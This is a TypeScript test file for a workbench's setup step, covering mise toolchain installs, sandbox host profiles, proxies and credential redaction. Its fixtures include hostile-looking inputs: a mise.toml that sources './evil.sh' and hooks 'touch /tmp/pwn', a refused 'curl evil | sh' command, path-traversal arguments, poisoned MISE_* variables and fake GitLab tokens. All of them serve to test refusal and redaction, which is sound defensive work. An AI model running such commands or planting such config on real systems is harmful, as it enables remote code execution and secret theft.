/**
 * The setup step (`T11.4`, `D10` decision 3, `A19`): the domain's rules (before the first stage, blocked on the environment,
 * resumed by its owner, run again after a restart), the handler (pins read by the host, `mise` only in the `toolchain` profile,
 * every directory and version checked), and the wrapper's `toolchain` and `setup` host profiles.
 */
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { installedDirectory, printsVersion, setupHandler, type ConfinedRun, type SetupDeps } from '../src/adapters/setup.ts'
import { render } from '../src/adapters/messages.ts'
import type { SetupPayload, Toolchain } from '../src/domain/job.ts'
import { RepositoryProfileSchema, type RepositoryProfileInput } from '../src/domain/repositories.ts'
import { DISABLED_BACKENDS, planSandbox, SANDBOX_SOCKET, type JobFile, type PlanInput, type WrapperConfig } from '../src/sandbox/profile.ts'
import { standardDelivery } from '../src/workflows/standard-delivery.ts'
import { ANNA, Harness } from './fixtures/domain-workflow.ts'

const LEDGER: RepositoryProfileInput = { name: 'ledger', project: 'acme/ledger', testCommand: 'pytest -q', setupCommand: 'uv sync --frozen',
  toolchains: { python: '3.12' }, default: true }
const PYTHON: Toolchain = { tool: 'python', requested: '3.12', from: 'profile', version: '3.12.12', bin: '/var/lib/workbench/toolchains/data/installs/python/3.12.12/bin' }
const passed = (toolchains: Toolchain[] = []) => ({ ok: { outcome: 'passed', toolchains, ignored: [], evidence: 'python 3.12.12' } })

let h: Harness | undefined
afterEach(() => { h?.cleanup(); h = undefined })

describe('the setup step in a job (A19)', () => {
  it('runs before the first stage of a job with a repository, records the toolchains, then starts inspect', async () => {
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push(passed([PYTHON]))
    const job = await h.start('@workbench сделай ORD-1')
    expect(h.setupRuns).toEqual([{ jobId: job, manifestId: h.state(job).manifestId, n: 1 }])
    // The ticket the trigger names is linked at the start (`D12`), alongside the setup.
    expect(h.wb.kernel.engine.events(job).map(event => event.type).slice(0, 8))
      .toEqual(['JobStarted', 'ThreadBound', 'ActionRequested', 'SetupStarted', 'ActionSettled', 'ThreadBound', 'SetupCompleted', 'AttemptStarted'])
    expect(h.state(job)).toMatchObject({ toolchains: [PYTHON], attempt: { stageId: 'inspect', entry: 'initial' } })
  })

  it('records the test services a setup chose, so every later sandbox of the job gets them (T12.4)', async () => {
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push({ ok: { outcome: 'passed', toolchains: [PYTHON], ignored: [], services: { postgres: '16' }, evidence: 'python 3.12.12, Postgres 16' } })
    const job = await h.start('@workbench сделай ORD-1')
    expect(h.state(job)).toMatchObject({ toolchains: [PYTHON], services: { postgres: '16' }, attempt: { stageId: 'inspect' } })
  })

  it('starts no setup for a job with no repository', async () => {
    h = new Harness({ workflows: [standardDelivery()] })
    const job = await h.start('@workbench сделай ORD-1')
    expect(h.setupRuns).toEqual([])
    expect(h.state(job).attempt?.stageId).toBe('inspect')
  })

  it('blocks on a failed setup with the log, asks to retry or cancel, and runs it again on ok, using no attempt', async () => {
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push({ ok: { outcome: 'blocked', evidence: 'python 3.12.7 could not be installed\nNo GitHub artifact attestations found' } }, passed([PYTHON]))
    const job = await h.start('@workbench сделай ORD-1')
    expect(h.state(job).status).toMatchObject({ kind: 'blocked', reason: { kind: 'setup_blocked', detail: expect.stringContaining('attestations') } })
    expect(h.state(job).attemptCount).toBe(0)
    const blocked = h.outbound('blocked').at(-1)!
    const text = render(blocked, { locale: 'en', stageTitle: id => id, artifactText: () => undefined, name: actor => actor.id, maxChars: 10_000 })
    expect(text).toContain('could not be prepared')
    expect(text).toContain('No GitHub artifact attestations found')
    expect(text).toContain('reply "ok" to run the setup again')
    await h.say(ANNA, 'ок')
    expect(h.setupRuns.map(run => run.n)).toEqual([1, 2])
    expect(h.state(job)).toMatchObject({ toolchains: [PYTHON], attempt: { stageId: 'inspect', entry: 'initial', n: 1 } })
  })

  it('treats a malformed result, or a handler failure, as blocked, never as passed', async () => {
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push({ ok: { outcome: 'passed', toolchains: [{ ...PYTHON, bin: 'relative/bin' }], ignored: [], evidence: '' } }, { fail: 'disk full' })
    const job = await h.start('@workbench сделай ORD-1')
    expect(h.state(job).status).toMatchObject({ kind: 'blocked', reason: { detail: 'the setup step returned no result' } })
    await h.say(ANNA, 'ок')
    expect(h.state(job).status).toMatchObject({ kind: 'blocked', reason: { detail: 'the setup step could not run: disk full' } })
  })

  it('runs again by itself after a restart interrupts it', async () => {
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push('hold', passed([PYTHON]))
    const job = await h.start('@workbench сделай ORD-1')
    expect(h.state(job).status).toMatchObject({ kind: 'setting_up', n: 1 })
    await h.restart()
    expect(h.setupRuns.map(run => run.n)).toEqual([1, 2])
    expect(h.state(job)).toMatchObject({ toolchains: [PYTHON], attempt: { stageId: 'inspect' } })
  })

  it('runs again once after an interruption, then blocks when interrupted again, and ok runs it afresh (review)', async () => {
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push('hold', 'hold', passed([PYTHON]))
    const job = await h.start('@workbench сделай ORD-1')
    await h.restart()
    expect(h.state(job).status).toMatchObject({ kind: 'setting_up', n: 2, afterInterruption: true })
    await h.restart()
    expect(h.state(job).status).toMatchObject({ kind: 'blocked', reason: { kind: 'setup_blocked', detail: 'the setup step was interrupted by a restart twice in a row' } })
    expect(h.setupRuns.map(run => run.n)).toEqual([1, 2])
    await h.say(ANNA, 'ок')
    expect(h.setupRuns.map(run => run.n)).toEqual([1, 2, 3])
    expect(h.state(job)).toMatchObject({ toolchains: [PYTHON], attempt: { stageId: 'inspect' } })
  })

  it('is stopped when its job is cancelled, and a late result changes nothing', async () => {
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push('hold')
    const job = await h.start('@workbench сделай ORD-1')
    await h.say(ANNA, 'стоп')
    expect(h.status(job)).toBe('cancelled')
    expect(h.wb.kernel.db.get("SELECT status FROM effect WHERE kind = 'setup'")).toEqual({ status: 'failed' })
    expect(h.state(job).attemptCount).toBe(0)
  })
})

describe('the setup handler', () => {
  let root: string, worktree: string, cache: string
  const runs: { argv: readonly string[]; cwd: string; profile: string }[] = []
  const files: { worktree: string; socket?: string; toolchainSocket?: string; toolchains?: readonly string[] }[] = []
  beforeEach(() => {
    root = realpathSync(mkdtempSync(join(tmpdir(), 'awb-setup-')))
    worktree = join(root, 'work', 'job_1')
    cache = join(root, 'toolchains')
    mkdirSync(worktree, { recursive: true })
    mkdirSync(join(cache, 'data', 'installs'), { recursive: true })
    runs.length = 0
    files.length = 0
  })
  afterEach(() => { rmSync(root, { recursive: true, force: true }) })

  /** A fake confined runner: mise install succeeds, mise where names `where(spec)`, a version command prints `prints(path)`. */
  const runner = (over: { where?: (spec: string) => string; prints?: (exe: string) => string; install?: (argv: readonly string[]) => number; setup?: number;
    venv?: number } = {}): ConfinedRun =>
    async command => {
      runs.push({ argv: command.argv, cwd: command.cwd, profile: command.profile })
      const [program, verb, ...rest] = command.argv
      const out = (stdout: string, exitCode = 0) => ({ exitCode, output: stdout, stdout })
      if (program === '/opt/mise/bin/mise' && verb === 'install') return out('', over.install?.(command.argv) ?? 0)
      if (program === '/opt/mise/bin/mise' && verb === 'where') {
        const spec = rest[0]!
        const dir = over.where?.(spec) ?? join(cache, 'data', 'installs', spec.startsWith('core:python') ? 'python' : 'node', spec.startsWith('core:python') ? '3.12.12' : '22.12.0')
        mkdirSync(dir, { recursive: true })
        return out(`${dir}\n`)
      }
      if (command.profile === 'setup' && program === 'sh') return out('Resolved 3 packages\nGITLAB_TOKEN=glpat-abcdefghijklmnopqrst\n', over.setup ?? 0)
      if (command.profile === 'setup') return out('', over.venv ?? 0)
      return out(over.prints?.(program!) ?? (program!.includes('python') ? 'Python 3.12.12' : 'v22.12.0'))
    }
  const deps = (run: ConfinedRun, profile: RepositoryProfileInput = LEDGER, withCache = true): SetupDeps => ({
    workbench: {} as never, prepareWorkspace: async () => worktree, repository: () => RepositoryProfileSchema.parse(profile), run,
    ...withCache ? { toolchains: { root: cache, mise: '/opt/mise/bin/mise' } } : {},
    openToolchainProxy: async () => '/s/toolchain.sock', openRegistriesProxy: async () => '/s/registries.sock', closeProxies: () => {},
    prepareJob: (_jobId, file) => { files.push(file) } })
  const payload: SetupPayload = { jobId: 'job_1', manifestId: 'm', n: 1 }
  const result = async (d: SetupDeps) => (await setupHandler(d).run(payload, 'k', 1) as { ok: Record<string, unknown> }).ok

  it('installs the pinned tools by full name in the toolchain profile, outside the worktree, then runs the setup command with them on PATH', async () => {
    writeFileSync(join(worktree, 'mise.toml'), '[env]\n_.source = "./evil.sh"\n[tools]\nnode = "22.12.0"\n[hooks]\nenter = "touch /tmp/pwn"\n')
    const ok = await result(deps(runner()))
    expect(ok).toMatchObject({ outcome: 'passed', toolchains: [
      { tool: 'node', requested: '22.12.0', from: 'mise.toml', version: '22.12.0', bin: join(cache, 'data', 'installs', 'node', '22.12.0', 'bin') },
      { tool: 'python', requested: '3.12', from: 'profile', version: '3.12.12', bin: join(cache, 'data', 'installs', 'python', '3.12.12', 'bin') }] })
    expect(runs.map(run => [run.profile, run.argv.join(' '), run.cwd === worktree ? 'worktree' : run.cwd === cache ? 'cache' : run.cwd])).toEqual([
      ['toolchain', '/opt/mise/bin/mise install core:node@22.12.0', 'cache'],
      ['toolchain', '/opt/mise/bin/mise where core:node@22.12.0', 'cache'],
      ['verify', `${join(cache, 'data/installs/node/22.12.0/bin/node')} --version`, 'cache'],
      ['toolchain', '/opt/mise/bin/mise install core:python@3.12', 'cache'],
      ['toolchain', '/opt/mise/bin/mise where core:python@3.12', 'cache'],
      ['verify', `${join(cache, 'data/installs/python/3.12.12/bin/python3')} --version`, 'cache'],
      ['setup', `${join(cache, 'data/installs/python/3.12.12/bin/python3')} -m venv ${join(worktree, '.home', 'venv')}`, 'worktree'],
      ['setup', 'sh -c uv sync --frozen', 'worktree']])
    expect(files).toEqual([{ worktree, toolchainSocket: '/s/toolchain.sock' },
      { worktree, socket: '/s/registries.sock', toolchains: [join(cache, 'data/installs/node/22.12.0/bin'), join(cache, 'data/installs/python/3.12.12/bin')] }])
  })

  it('blocks on a pin it cannot honour, or a linked pin file, before running anything', async () => {
    writeFileSync(join(worktree, '.nvmrc'), 'lts/*')
    expect(await result(deps(runner()))).toMatchObject({ outcome: 'blocked', evidence: expect.stringContaining('.nvmrc: node is pinned to "lts/*"') })
    rmSync(join(worktree, '.nvmrc'))
    writeFileSync(join(root, 'secret'), 'TOKEN=glpat-secret')
    symlinkSync(join(root, 'secret'), join(worktree, '.python-version'))
    const linked = await result(deps(runner()))
    expect(linked).toMatchObject({ outcome: 'blocked', evidence: expect.stringContaining('.python-version is a symbolic link') })
    expect(JSON.stringify(linked)).not.toContain('glpat')
    expect(runs).toEqual([])
  })

  it('refuses a directory mise names outside the cache, or by a moving link, and blocks', async () => {
    const outside = join(root, 'elsewhere', '3.12.12')
    expect(await result(deps(runner({ where: () => outside })))).toMatchObject({ outcome: 'blocked',
      evidence: expect.stringContaining('mise did not name an installed directory of its own') })
    mkdirSync(join(cache, 'data', 'installs', 'python', '3.12.12'), { recursive: true })
    symlinkSync('3.12.12', join(cache, 'data', 'installs', 'python', '3.12'))
    // A link inside the cache resolves to the exact version's directory, which is what is recorded.
    expect(installedDirectory(join(cache, 'data', 'installs', 'python', '3.12'), join(cache, 'data', 'installs'), 'python'))
      .toEqual({ path: join(cache, 'data', 'installs', 'python', '3.12.12'), version: '3.12.12' })
    symlinkSync(outside, join(cache, 'data', 'installs', 'python', 'latest'))
    expect(installedDirectory(join(cache, 'data', 'installs', 'python', 'latest'), join(cache, 'data', 'installs'), 'python')).toBeUndefined()
    expect(installedDirectory(join(cache, 'data', 'installs', 'node', '22.12.0'), join(cache, 'data', 'installs'), 'python')).toBeUndefined()
  })

  it('reinstalls a tool once when it does not print its version, and blocks when it still does not', async () => {
    let forced = 0
    const flaky = runner({ install: argv => { if (argv.includes('--force')) forced++; return 0 }, prints: exe => exe.includes('python') && forced === 0 ? '' : 'Python 3.12.12' })
    expect(await result(deps(flaky, { ...LEDGER, setupCommand: undefined }))).toMatchObject({ outcome: 'passed' })
    expect(forced).toBe(1)
    const broken = runner({ prints: () => 'Python 3.12.1' })
    expect(await result(deps(broken, { ...LEDGER, setupCommand: undefined }))).toMatchObject({ outcome: 'blocked',
      evidence: expect.stringContaining('does not run or prints another version') })
  })

  it('blocks on a failed install or setup command with the end of the log, credentials redacted', async () => {
    expect(await result(deps(runner({ install: () => 1 })))).toMatchObject({ outcome: 'blocked', evidence: expect.stringContaining('python 3.12 could not be installed') })
    const failed = await result(deps(runner({ setup: 2 })))
    expect(failed).toMatchObject({ outcome: 'blocked', evidence: expect.stringContaining('the setup command failed: uv sync --frozen') })
    expect(failed.evidence).toContain('Resolved 3 packages')
    expect(failed.evidence).not.toContain('glpat-abcdefghijklmnopqrst')
    expect(await result(deps(runner({ venv: 1 })))).toMatchObject({ outcome: 'blocked', evidence: expect.stringContaining('a virtual environment could not be made') })
  })

  it('blocks a job that needs toolchains in a deployment with no cache, and passes one that needs none', async () => {
    expect(await result(deps(runner(), LEDGER, false))).toMatchObject({ outcome: 'blocked', evidence: expect.stringContaining('no toolchain cache') })
    expect(await result(deps(runner(), { name: 'app', project: 'acme/app', testCommand: 'npm test' }, false))).toEqual({ outcome: 'passed', toolchains: [],
      ignored: [], evidence: 'no toolchains' })
    expect(runs).toEqual([])
  })

  it('chooses the Postgres major from the repository\'s CI before installing anything, and blocks on one the image lacks (T12.4)', async () => {
    const app: RepositoryProfileInput = { name: 'app', project: 'acme/app', testCommand: 'pytest' }
    const withServices = (profile: RepositoryProfileInput) => ({ ...deps(runner(), profile), services: { postgres: ['15', '16', '17', '18'] } })
    writeFileSync(join(worktree, '.gitlab-ci.yml'), 'test:\n  services: [postgres:16, rabbitmq:4.1]\n  script: [pytest]\n')
    expect(await result(withServices(app))).toEqual({ outcome: 'passed', toolchains: [], ignored: [], services: { postgres: '16' },
      evidence: 'Postgres 16\nnote: .gitlab-ci.yml names rabbitmq:4.1; jobs get RabbitMQ 3.10' })
    expect(await result(withServices({ ...app, postgres: 17 } as RepositoryProfileInput))).toMatchObject({ outcome: 'passed', services: { postgres: '17' } })
    writeFileSync(join(worktree, '.gitlab-ci.yml'), 'services: [postgres:13]\n')
    expect(await result(withServices(LEDGER))).toMatchObject({ outcome: 'blocked',
      evidence: expect.stringContaining('the job\'s test services cannot be set up: .gitlab-ci.yml names Postgres 13, which this image does not have') })
    expect(runs).toEqual([])
    // A CI file the host cannot parse blocks rather than guess, unless the profile names the major (review).
    writeFileSync(join(worktree, '.gitlab-ci.yml'), 'services: [postgres:15\n')
    expect(await result(withServices(app))).toMatchObject({ outcome: 'blocked', evidence: expect.stringContaining('set `postgres` in the repository profile') })
    expect(await result(withServices({ ...app, postgres: '15' }))).toMatchObject({ outcome: 'passed', services: { postgres: '15' } })
    // A deployment whose image has no services gives the job none.
    writeFileSync(join(worktree, '.gitlab-ci.yml'), 'services: [postgres:16]\n')
    expect(await result(deps(runner(), app))).toEqual({ outcome: 'passed', toolchains: [], ignored: [], evidence: 'no toolchains' })
  })

  it('reads a version only as a whole version', () => {
    expect(printsVersion('go version go1.24.0 linux/arm64', '1.24.0')).toBe(true)
    expect(printsVersion('v22.12.0\n', '22.12.0')).toBe(true)
    expect(printsVersion('Python 3.12.16', '3.12.1')).toBe(false)
    expect(printsVersion('uv 0.9.5 (2025-10-21)', '0.9.5')).toBe(true)
    expect(printsVersion('10.18.3', '0.18.3')).toBe(false)
  })
})

describe('the toolchain and setup host profiles', () => {
  const CACHE = '/var/lib/workbench/toolchains'
  const CONFIG: WrapperConfig = { bwrap: '/usr/bin/bwrap', masks: ['/var/lib/workbench/dsh', '/var/lib/workbench/state/data', '/var/lib/workbench/work/jobs'],
    workRoot: '/var/lib/workbench/work/jobs', jobs: '/var/lib/workbench/state/data/sandbox/jobs', gitConfig: '/var/lib/workbench/state/data/worker-gitconfig',
    node: '/usr/local/bin/node', bridge: '/workspace/lib/sandbox-bridge.js', toolchains: CACHE, mise: '/opt/mise/bin/mise' }
  const WORKTREE = '/var/lib/workbench/work/jobs/job_1'
  const TSOCK = '/var/lib/workbench/state/data/sandbox/toolchain-proxy/1.sock'
  const RSOCK = '/var/lib/workbench/state/data/sandbox/proxy/1.sock'
  const BIN = `${CACHE}/data/installs/python/3.12.12/bin`
  const JOB: JobFile = { jobId: 'job_1', worktree: WORKTREE, egress: 'none', toolchainSocket: TSOCK, socket: RSOCK, toolchains: { path: [BIN] } }
  const DSH = ['--ro-bind', '/', '/', '--dev', '/dev', '--unshare-pid', '--proc', '/proc', '--die-with-parent']
  const host = (profile: string) => ({ PATH: '/usr/bin', HOME: '/home/node', WORKBENCH_SANDBOX_JOB: 'job_1', WORKBENCH_SANDBOX_PROFILE: profile,
    MISE_DATA_DIR: '/tmp/evil', MISE_PARANOID: '0', MISE_TRUSTED_CONFIG_PATHS: '/', GITLAB_TOKEN: 'glpat' })
  const plan = (over: Partial<PlanInput> & { command?: string[]; job?: (id: string) => JobFile | undefined }) => planSandbox({
    args: [...DSH, '--', ...over.command ?? ['/opt/mise/bin/mise', 'install', 'core:python@3.12']], env: host('toolchain'), cwd: CACHE, config: CONFIG,
    job: id => (id === 'job_1' ? JOB : undefined), real: path => path, exists: () => true, ...over })

  it('installs with no worktree, only the cache writable, the toolchain proxy, and mise\'s settings fixed by the wrapper', () => {
    const result = plan({})
    expect(result.kind).toBe('run')
    if (result.kind !== 'run') return
    expect(result.egress).toBe('toolchain')
    expect(result.argv.join(' ')).not.toContain(WORKTREE)
    expect(result.argv.join(' ')).not.toContain('worker-gitconfig')
    const bind = result.argv.indexOf('--bind')
    expect(result.argv.slice(bind, bind + 3)).toEqual(['--bind', CACHE, CACHE])
    expect(result.argv.filter(arg => arg === '--bind')).toHaveLength(1)
    expect(result.argv.slice(result.argv.indexOf(TSOCK) - 1, result.argv.indexOf(TSOCK) + 2)).toEqual(['--ro-bind', TSOCK, SANDBOX_SOCKET])
    expect(result.argv.slice(result.argv.indexOf('--chdir'), result.argv.indexOf('--chdir') + 2)).toEqual(['--chdir', '/tmp'])
    expect(result.argv.slice(-7)).toEqual(['/usr/local/bin/node', '/workspace/lib/sandbox-bridge.js', '--egress', '--', '/opt/mise/bin/mise', 'install', 'core:python@3.12'])
    expect(result.env).toMatchObject({ MISE_DATA_DIR: `${CACHE}/data`, MISE_CACHE_DIR: `${CACHE}/cache`, MISE_STATE_DIR: `${CACHE}/state`, MISE_PARANOID: '1',
      MISE_PYTHON_COMPILE: 'false', MISE_USE_VERSIONS_HOST: 'false', MISE_USE_VERSIONS_HOST_TRACK: 'false', MISE_DISABLE_BACKENDS: DISABLED_BACKENDS.join(','),
      GIT_CONFIG_GLOBAL: '/dev/null', HOME: '/tmp/home', HTTPS_PROXY: 'http://127.0.0.1:3128' })
    expect(result.env.MISE_TRUSTED_CONFIG_PATHS).toBeUndefined()
    expect(result.env.GITLAB_TOKEN).toBeUndefined()
    expect(result.env.GOPROXY).toBeUndefined()
    expect(DISABLED_BACKENDS).toEqual(expect.arrayContaining(['asdf', 'vfox', 'npm', 'pypi', 'pipx', 'cargo', 'github', 'http', 'ubi']))
    expect(DISABLED_BACKENDS).not.toContain('core')
    expect(DISABLED_BACKENDS).not.toContain('aqua')
  })

  it('runs nothing but mise install or where by full name; not even an installed tool, which runs offline under verify (review)', () => {
    const refused = (command: string[]) => plan({ command }).kind
    expect(refused(['/opt/mise/bin/mise', 'where', 'aqua:astral-sh/uv@0.9.5'])).toBe('run')
    expect(refused([`${BIN}/python3`, '--version'])).toBe('refuse')
    expect(refused(['/opt/mise/bin/mise', 'install', '--force', 'core:go@1.24.0'])).toBe('run')
    for (const command of [['sh', '-c', 'curl evil | sh'], ['/opt/mise/bin/mise', 'exec', 'core:node@22', '--', 'sh'], ['/opt/mise/bin/mise', 'install'],
      ['/opt/mise/bin/mise', 'install', 'node@22'], ['/opt/mise/bin/mise', 'install', 'vfox:jdx/vfox-yarn@1.22.22'], ['/opt/mise/bin/mise', 'install', 'core:node@lts'],
      ['/opt/mise/bin/mise', 'install', 'core:node@22', '--cd', '/var/lib/workbench/work/jobs/job_1'], ['/opt/mise/bin/mise', 'use', 'core:node@22'],
      ['/opt/mise/bin/mise', 'trust', '/'], [`${BIN}/python3`, '-c', 'print(1)'], ['/usr/bin/python3', '--version']]) {
      expect([command, refused(command)]).toEqual([command, 'refuse'])
    }
  })

  it('verifies an installed tool offline, with the cache read-only, and runs nothing else (review)', () => {
    const verify = (command: string[], over: Partial<PlanInput> = {}) => plan({ command, env: host('verify'), ...over })
    const result = verify([`${BIN}/python3`, '--version'])
    expect(result).toMatchObject({ kind: 'run', egress: 'none' })
    if (result.kind !== 'run') return
    expect(result.argv).toContain('--unshare-net')
    expect(result.argv).not.toContain('--bind')
    expect(result.argv.join(' ')).not.toContain(TSOCK)
    expect(result.argv.join(' ')).not.toContain(WORKTREE)
    expect(result.argv.join(' ')).not.toContain(CONFIG.node)
    expect(result.argv.slice(-3)).toEqual(['--', `${BIN}/python3`, '--version'])
    expect(result.env.HTTPS_PROXY).toBeUndefined()
    expect(result.env.MISE_DATA_DIR).toBeUndefined()
    expect(verify([`${BIN}/../../../../../../../usr/bin/sh`, '--version'], { real: path => path.includes('..') ? '/usr/bin/sh' : path }).kind).toBe('refuse')
    for (const command of [['/opt/mise/bin/mise', 'install', 'core:node@22'], [`${BIN}/python3`, '-c', 'print(1)'], [`${BIN}/python3`], ['sh', '-c', 'id'],
      [`${BIN}/python3`, '--version', '--extra']]) expect([command, verify(command).kind]).toEqual([command, 'refuse'])
    expect(plan({ env: host('verify'), args: [...DSH, '--tmpfs', '/tmp', '--bind', WORKTREE, WORKTREE, '--', `${BIN}/python3`, '--version'] }))
      .toEqual({ kind: 'refuse', reason: 'the verify profile runs read-only, with no worktree' })
  })

  it('is chosen only by the host: an agent shell with a writable root, DSH\'s write mode, or a missing proxy is refused', () => {
    expect(plan({ args: [...DSH, '--tmpfs', '/tmp', '--bind', WORKTREE, WORKTREE, '--', '/opt/mise/bin/mise', 'install', 'core:node@22'] }))
      .toEqual({ kind: 'refuse', reason: 'the toolchain profile runs read-only, with no worktree' })
    expect(plan({ exists: path => path !== TSOCK })).toEqual({ kind: 'refuse', reason: 'job job_1\'s toolchain proxy is not running' })
    // An agent shell names its job in DSH_WORKBENCH_JOB; a host profile variable it might inherit is not a host marker.
    const agent = plan({ env: { PATH: '/usr/bin', DSH_WORKBENCH_JOB: 'job_1', WORKBENCH_SANDBOX_PROFILE: 'toolchain' } })
    expect(agent.kind === 'run' && [agent.egress, agent.argv.includes(CACHE)]).toEqual(['none', false])
    expect(plan({ job: () => ({ ...JOB, egress: 'toolchain' as never }), env: { PATH: '/usr/bin', DSH_WORKBENCH_JOB: 'job_1' } }))
      .toEqual({ kind: 'refuse', reason: 'job job_1\'s file names an unknown egress profile' })
    expect(plan({ config: { ...CONFIG, toolchains: '/var/lib/workbench/state/data/toolchains' } }))
      .toEqual({ kind: 'refuse', reason: 'the toolchain cache /var/lib/workbench/state/data/toolchains overlaps a masked directory' })
    const { toolchains: _cache, ...noCache } = CONFIG
    expect(plan({ config: noCache })).toEqual({ kind: 'refuse', reason: 'this deployment has no toolchain cache' })
  })

  it('runs the setup command in the worktree with the registries proxy and the toolchains first on PATH, each checked to be in the cache', () => {
    const setup = (job: JobFile, args = [...DSH, '--tmpfs', '/tmp', '--bind', WORKTREE, WORKTREE, '--', 'sh', '-c', 'uv sync --frozen']) =>
      planSandbox({ args, env: host('setup'), cwd: WORKTREE, config: CONFIG, job: () => job, real: path => path, exists: () => true })
    const result = planSandbox({ args: [...DSH, '--tmpfs', '/tmp', '--bind', WORKTREE, WORKTREE, '--', 'sh', '-c', 'uv sync --frozen'], env: host('setup'),
      cwd: WORKTREE, config: CONFIG, job: () => JOB, real: path => path, exists: path => !path.endsWith('/venv/bin/python') })
    expect(result).toMatchObject({ kind: 'run', egress: 'registries' })
    if (result.kind !== 'run') return
    expect(result.env.PATH).toBe(`${BIN}:${WORKTREE}/.home/.npm-global/bin:${WORKTREE}/.home/go/bin:/usr/bin`)
    expect(result.env).toMatchObject({ HOME: `${WORKTREE}/.home`, GOPROXY: 'https://proxy.golang.org' })
    expect(result.argv.slice(result.argv.indexOf(RSOCK) - 1, result.argv.indexOf(RSOCK) + 2)).toEqual(['--ro-bind', RSOCK, SANDBOX_SOCKET])
    expect(setup({ ...JOB, toolchains: { path: ['/tmp/evil/bin'] } })).toEqual({ kind: 'refuse', reason: 'job job_1\'s toolchain directory "/tmp/evil/bin" is not in the toolchain cache' })
    expect(setup({ ...JOB, toolchains: { path: [`${CACHE}/data/installs/../../../../tmp`] } }).kind).toBe('refuse')
    expect(setup({ ...JOB, toolchains: { path: [`${BIN}:/tmp`] } }).kind).toBe('refuse')
    expect(setup(JOB, [...DSH, '--', 'sh', '-c', 'x'])).toEqual({ kind: 'refuse', reason: 'the setup profile runs in the job\'s worktree' })
  })

  it('gives every sandbox of the job its toolchains, with its virtual environment first and global installs in its home (T11.5)', () => {
    const home = `${WORKTREE}/.home`
    const run = (env: Record<string, string>, venv = true) => planSandbox({ args: [...DSH, '--tmpfs', '/tmp', '--bind', WORKTREE, WORKTREE, '--', 'sh', '-c', 'pytest'],
      env, cwd: WORKTREE, config: CONFIG, job: () => JOB, real: path => path, exists: path => venv || !path.endsWith('/venv/bin/python') })
    // An agent shell and a host check of the same job: the same toolchains; the check stays offline.
    for (const [env, egress] of [[{ PATH: '/usr/bin', DSH_WORKBENCH_JOB: 'job_1' }, 'none'], [host('check'), 'none']] as const) {
      const result = run(env)
      expect(result).toMatchObject({ kind: 'run', egress })
      if (result.kind !== 'run') continue
      expect(result.env).toMatchObject({ PATH: `${home}/venv/bin:${BIN}:${home}/.npm-global/bin:${home}/go/bin:/usr/bin`, VIRTUAL_ENV: `${home}/venv`,
        NPM_CONFIG_PREFIX: `${home}/.npm-global`, GOPATH: `${home}/go`, GOTOOLCHAIN: 'local', UV_PYTHON_DOWNLOADS: 'never' })
      expect(result.argv).not.toContain(`${CACHE}`)
    }
    const novenv = run({ PATH: '/usr/bin', DSH_WORKBENCH_JOB: 'job_1' }, false)
    expect(novenv.kind === 'run' && [novenv.env.PATH, novenv.env.VIRTUAL_ENV]).toEqual([`${BIN}:${home}/.npm-global/bin:${home}/go/bin:/usr/bin`, undefined])
    // A toolchain directory outside the cache refuses every sandbox of the job, not only the setup command.
    expect(planSandbox({ args: [...DSH, '--tmpfs', '/tmp', '--bind', WORKTREE, WORKTREE, '--', 'ls'], env: { PATH: '/usr/bin', DSH_WORKBENCH_JOB: 'job_1' },
      cwd: WORKTREE, config: CONFIG, job: () => ({ ...JOB, toolchains: { path: [`${WORKTREE}/bin`] } }), real: path => path, exists: () => true }).kind).toBe('refuse')
    // A tool cannot download a toolchain of its own, whatever the host's environment says.
    const hostile = run({ PATH: '/usr/bin', DSH_WORKBENCH_JOB: 'job_1', GOTOOLCHAIN: 'auto', UV_PYTHON_DOWNLOADS: 'automatic' })
    expect(hostile.kind === 'run' && [hostile.env.GOTOOLCHAIN, hostile.env.UV_PYTHON_DOWNLOADS]).toEqual(['local', 'never'])
  })
})

describe('the setup step\'s connections (T11.8)', () => {
  it('are recorded against the setup step, not against no attempt', async () => {
    const { connectionLabel } = await import('../src/app/workbench-runtime.ts')
    h = new Harness({ workflows: [standardDelivery()], repositories: [LEDGER] })
    h.setups.push('hold')
    const job = await h.start('@workbench сделай ORD-1')
    expect(connectionLabel(h.state(job))).toBe('setup')
    await h.restart()
    expect(connectionLabel(h.state(job))).toBe(h.state(job).attempt!.id)
    expect(connectionLabel(undefined)).toBeUndefined()
  })
})

describe('the job\'s home in its worktree (T11.5)', () => {
  it('is left out of the job\'s commits: a virtual environment or npm prefix there never shows as a change', async () => {
    const { execFileSync } = await import('node:child_process')
    const { excludeJobHome } = await import('../src/infra/git-layout.ts')
    const repo = realpathSync(mkdtempSync(join(tmpdir(), 'awb-home-')))
    try {
      const git = (...args: string[]) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...args], { cwd: repo, encoding: 'utf8' })
      git('init', '-q')
      writeFileSync(join(repo, 'app.py'), 'print(1)\n')
      await excludeJobHome(repo)
      mkdirSync(join(repo, '.home', 'venv', 'bin'), { recursive: true })
      writeFileSync(join(repo, '.home', 'venv', 'bin', 'python'), '')
      git('add', '-A')
      expect(git('status', '--porcelain')).toBe('A  app.py\n')
    } finally { rmSync(repo, { recursive: true, force: true }) }
  })
})
